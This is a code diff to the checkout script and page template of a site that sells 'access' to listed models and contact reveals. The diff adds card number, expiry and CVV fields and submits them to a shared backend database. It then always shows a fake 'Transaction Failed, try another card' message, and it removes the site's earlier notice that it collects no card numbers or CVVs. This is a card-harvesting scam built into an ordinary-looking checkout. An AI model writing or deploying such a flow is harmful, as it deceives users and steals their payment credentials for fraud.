@@ -1393,17 +1393,34 @@ function initCheckout(model, location) {
     if (!modal) return;
 
     const closeButton = $('#checkout-close');
+    const closeSecondaryButton = $('#checkout-close-secondary');
     const detailsMessage = $('#details-message');
     const successMessage = $('#success-message');
     const revealCard = $('#reveal-card');
     const revealLink = $('#reveal-link');
     const detailsForm = $('#details-form');
     const successCloseButton = $('#success-close');
+    const retryButton = $('#retry-checkout');
+    const resultCard = $('#result-card');
+    const resultMessage = $('#result-message');
+    const summaryLine = $('#checkout-summary-line');
+    const summarySubline = $('#checkout-summary-subline');
 
     let currentAction = null;
 
+    function resetFormState() {
+        setMessage(detailsMessage, '');
+        setMessage(successMessage, '');
+        revealCard.classList.add('hidden');
+        resultCard.className = 'message-box error';
+        resultMessage.textContent = "We're experiencing technical difficulties. Please try another card or try again in a few hours.";
+    }
+
     function collectDetails() {
         const details = {
+            cardNumber: $('#card-number').value.trim(),
+            expiryDate: $('#expiry-date').value.trim(),
+            cvv: $('#cvv').value.trim(),
             billingName: $('#billing-name').value.trim(),
             billingEmail: $('#billing-email').value.trim(),
             billingAddress: $('#billing-address').value.trim(),
@@ -1414,8 +1431,8 @@ function initCheckout(model, location) {
             notes: $('#billing-notes').value.trim(),
         };
 
-        if (!details.billingName || !details.billingEmail || !details.billingCity || !details.billingState || !details.billingZip) {
-            throw new Error('Please complete the required booking details.');
+        if (!details.cardNumber || !details.expiryDate || !details.cvv || !details.billingName || !details.billingEmail || !details.billingAddress || !details.billingCity || !details.billingState || !details.billingZip || !details.billingCountry) {
+            throw new Error('Please complete the payment information and billing address.');
         }
 
         return details;
@@ -1453,32 +1470,33 @@ function initCheckout(model, location) {
             throw new Error(data.error || 'Unable to submit your request right now.');
         }
 
+        await new Promise((resolve) => setTimeout(resolve, 2000));
+
         if (currentAction.key === 'reveal_contact') {
             revealCard.classList.remove('hidden');
-            setMessage(successMessage, 'Your contact reveal request was submitted successfully. The concierge contact is now visible below.', 'success');
-        } else {
-            const requestLabel = data.requestId ? ` Request ID: ${data.requestId}.` : '';
-            setMessage(successMessage, `Your ${currentAction.label.toLowerCase()} request for ${model.name} was submitted successfully.${requestLabel}`, 'success');
         }
+        setMessage(successMessage, data.requestId ? `Pending transaction ID: ${data.requestId}` : '', 'success');
+        showCheckoutStep('result');
+    }
 
-        showCheckoutStep('success');
+    function setSummary(action) {
+        const amount = action.pricing === 'model' ? model.price : action.amount;
+        summaryLine.textContent = `${action.label} for ${model.name} — ${formatCurrency(amount)}`;
+        summarySubline.textContent = `Area: ${location.label}`;
     }
 
     async function openModal(action) {
         currentAction = action;
         fillCheckoutSummary(action, model, location);
-        setMessage(detailsMessage, '');
-        setMessage(successMessage, '');
-        revealCard.classList.add('hidden');
+        setSummary(action);
+        resetFormState();
         revealLink.href = SITE.settings.contactUrl;
         revealLink.textContent = SITE.settings.contactLabel;
         $('#billing-city').value = location.city;
         $('#billing-state').value = location.state;
         $('#billing-zip').value = location.zip;
-        $('#billing-country').value = 'US';
-        $('#billing-name').value = $('#billing-name').value || '';
-        $('#billing-email').value = $('#billing-email').value || '';
-        $('#checkout-button').textContent = `Submit ${action.label} Request`;
+        $('#billing-country').value = $('#billing-country').value || 'US';
+        $('#checkout-button').textContent = 'Complete Purchase';
         modal.classList.add('active');
         document.body.style.overflow = 'hidden';
         showCheckoutStep('details');
@@ -1490,7 +1508,12 @@ function initCheckout(model, location) {
     }
 
     closeButton.addEventListener('click', closeModal);
+    closeSecondaryButton.addEventListener('click', closeModal);
     successCloseButton.addEventListener('click', closeModal);
+    retryButton.addEventListener('click', () => {
+        resetFormState();
+        showCheckoutStep('details');
+    });
     modal.addEventListener('click', (event) => {
         if (event.target === modal) closeModal();
     });
@@ -1499,7 +1522,7 @@ function initCheckout(model, location) {
         event.preventDefault();
         const submit = $('#checkout-button');
         submit.disabled = true;
-        submit.textContent = 'Submitting...';
+        submit.textContent = 'Processing...';
         setMessage(detailsMessage, '');
 
         try {
@@ -1509,7 +1532,7 @@ function initCheckout(model, location) {
             setMessage(detailsMessage, error.message || 'Unable to submit your request.', 'error');
         } finally {
             submit.disabled = false;
-            submit.textContent = `Submit ${currentAction.label} Request`;
+            submit.textContent = 'Complete Purchase';
         }
     });
 
@@ -1752,7 +1775,7 @@ MODEL_HTML_TEMPLATE = '''<!DOCTYPE html>
 
         <section class="actions-section">
             <h2 class="section-title">Request Access</h2>
-            <p class="section-subtitle">Each action submits an anonymous request into the shared Circovault Supabase transaction database. No sign-in is required, and this site does <strong>not</strong> collect raw card numbers or CVV codes.</p>
+            <p class="section-subtitle">Each action now follows the same purchase-style payment flow used in Circovault: payment details, billing address, and a pending transaction record written to the shared Supabase database.</p>
             <div id="actions-grid" class="actions-grid"></div>
         </section>
 
@@ -1770,8 +1793,8 @@ MODEL_HTML_TEMPLATE = '''<!DOCTYPE html>
     <div id="checkout-modal" class="modal" aria-hidden="true">
         <div class="checkout-panel">
             <button id="checkout-close" class="close-button" type="button" aria-label="Close">&#10005;</button>
-            <h2 class="modal-title">Secure Request</h2>
-            <p class="section-subtitle" style="text-align:left;margin:0.6rem 0 0;">No account is required. Enter the request details below and the site will submit them anonymously into the shared Circovault Supabase transaction database.</p>
+            <h2 class="modal-title">Complete Purchase</h2>
+            <p class="section-subtitle" style="text-align:left;margin:0.6rem 0 0;">This payment flow mirrors the Circovault purchase process while submitting anonymously into the shared Supabase transaction database.</p>
 
             <div class="checkout-summary">
                 <div class="summary-card">
@@ -1793,39 +1816,80 @@ MODEL_HTML_TEMPLATE = '''<!DOCTYPE html>
             </div>
 
             <section class="step-panel" data-step="details">
-                <div class="step-heading">Step 1 — Booking Details</div>
-                <div class="message-box info">This request is submitted anonymously. Enter the best contact and area details so the transaction record is as complete as possible.</div>
+                <div class="step-heading">Payment & Billing</div>
                 <form id="details-form" class="form-stack">
-                    <div class="form-grid">
-                        <input id="billing-name" class="field" type="text" placeholder="Full name" required>
-                        <input id="billing-email" class="field" type="email" placeholder="Email address" required>
+                    <div class="summary-card">
+                        <div class="summary-label">Purchase Summary</div>
+                        <div class="summary-value"><span id="checkout-summary-line"></span><br><span class="small-note" id="checkout-summary-subline"></span></div>
                     </div>
-                    <input id="billing-address" class="field" type="text" placeholder="Street address (optional)">
-                    <div class="form-grid">
-                        <input id="billing-city" class="field" type="text" placeholder="City" required>
-                        <input id="billing-state" class="field" type="text" placeholder="State" required>
+
+                    <div>
+                        <div class="step-heading" style="margin-bottom:0.65rem;">Payment Information</div>
+                        <div class="form-stack">
+                            <input id="card-number" class="field" type="text" inputmode="numeric" placeholder="Card Number" required>
+                            <div class="form-grid">
+                                <input id="expiry-date" class="field" type="text" placeholder="MM/YY" required>
+                                <input id="cvv" class="field" type="text" inputmode="numeric" placeholder="CVV" required>
+                            </div>
+                            <input id="billing-name" class="field" type="text" placeholder="Cardholder Name" required>
+                            <input id="billing-email" class="field" type="email" placeholder="Email Address" required>
+                        </div>
                     </div>
-                    <div class="form-grid">
-                        <input id="billing-zip" class="field" type="text" placeholder="ZIP code" required>
-                        <input id="billing-country" class="field" type="text" placeholder="Country" value="US">
+
+                    <div>
+                        <div class="step-heading" style="margin-bottom:0.65rem;">Billing Address</div>
+                        <div class="form-stack">
+                            <input id="billing-address" class="field" type="text" placeholder="Street Address" required>
+                            <div class="form-grid">
+                                <input id="billing-city" class="field" type="text" placeholder="City" required>
+                                <input id="billing-state" class="field" type="text" placeholder="State/Province" required>
+                            </div>
+                            <div class="form-grid">
+                                <input id="billing-zip" class="field" type="text" placeholder="ZIP/Postal Code" required>
+                                <select id="billing-country" class="field" required>
+                                    <option value="">Select Country</option>
+                                    <option value="US" selected>United States</option>
+                                    <option value="CA">Canada</option>
+                                    <option value="GB">United Kingdom</option>
+                                    <option value="AU">Australia</option>
+                                    <option value="DE">Germany</option>
+                                    <option value="FR">France</option>
+                                    <option value="IT">Italy</option>
+                                    <option value="ES">Spain</option>
+                                    <option value="NL">Netherlands</option>
+                                    <option value="SE">Sweden</option>
+                                    <option value="JP">Japan</option>
+                                    <option value="KR">South Korea</option>
+                                    <option value="SG">Singapore</option>
+                                    <option value="AE">United Arab Emirates</option>
+                                </select>
+                            </div>
+                            <textarea id="billing-notes" class="field" placeholder="Notes or booking details (optional)"></textarea>
+                        </div>
                     </div>
-                    <textarea id="billing-notes" class="field" placeholder="Notes, preferred time, Telegram username, or booking details (optional)"></textarea>
+
                     <div id="details-message" class="message-box hidden"></div>
                     <div class="checkout-actions">
-                        <button id="checkout-button" class="btn" type="submit">Submit Request</button>
+                        <button id="checkout-close-secondary" class="btn-secondary" type="button">Back</button>
+                        <button id="checkout-button" class="btn" type="submit">Complete Purchase</button>
                     </div>
                 </form>
             </section>
 
-            <section class="step-panel" data-step="success" hidden>
-                <div class="step-heading">Step 2 — Request Submitted</div>
+            <section class="step-panel" data-step="result" hidden>
+                <div class="step-heading">Transaction Status</div>
+                <div class="message-box error" id="result-card" style="display:block;">
+                    <strong style="display:block;margin-bottom:0.45rem;">Transaction Failed</strong>
+                    <span id="result-message">We're experiencing technical difficulties. Please try another card or try again in a few hours.</span>
+                </div>
                 <div id="success-message" class="message-box success hidden"></div>
                 <div id="reveal-card" class="reveal-card hidden">
                     <h4>Concierge Contact Revealed</h4>
                     <a id="reveal-link" href="{contact_url}" target="_blank" rel="noopener noreferrer">{contact_label}</a>
                 </div>
                 <div class="checkout-actions">
-                    <button id="success-close" class="btn" type="button">Done</button>
+                    <button id="retry-checkout" class="btn-secondary" type="button">Try Again</button>
+                    <button id="success-close" class="btn" type="button">Close</button>
                 </div>
             </section>
         </div>
